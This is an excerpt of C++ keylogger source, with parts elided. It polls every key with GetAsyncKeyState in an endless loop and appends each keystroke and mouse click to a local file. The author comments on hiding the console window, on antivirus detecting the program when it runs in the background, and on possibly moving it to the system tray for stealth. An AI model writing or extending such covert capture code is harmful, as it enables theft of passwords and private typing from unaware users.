...
//the character codes are in hexadecimal value and were found in https://docs.microsoft.com/en-us/windows/win32/inputdev/virtual-key-codes
...
int main() {
	...
	//ShowWindow(FindWindowA("ConsoleWindowClass", NULL), false); //makes the app run in the background
	// This line is commented out because for some reason an antivirus can detect a malicious program if it's running in the background though everything is fine if the malicious program is running on the foreground? lol... Maybe I can minimize it to system tray???

	cout << "Keystroke logging, often referred to as keylogging or keyboard capturing, is the action of recording the keys struck on a keyboard, typically covertly, so that a person using the keyboard is unaware that their actions are being monitored. Data can then be retrieved by the person operating the logging program.";
	while (true) {

		//I am checking for every character in the keyboard. There are some combinations which i had to implement manually because for example there is a difference  between "alt + tab" and "tab + alt". Also, if i didn't implement the combinations, then if the user typed for example "shift + a", the output would be "shift shift shift + a" because the user presses repeatidly shift, though the action only counts as once. 
		if (GetAsyncKeyState(0x01) == -32767) { //-32767 means that a button is just left by the user.
			arxeio << " \"LCLICK\" ";
			...
			//if the user doesn't press buttons, the file will close (to save everything it has captured) and open it again to capture the next letter. Because of this way i am inplementing the keylogger, the app will save the keystrokes, letter by letter.
			arxeio.close();
			arxeio.open("arxeio.txt", fstream::app);
		}
	}
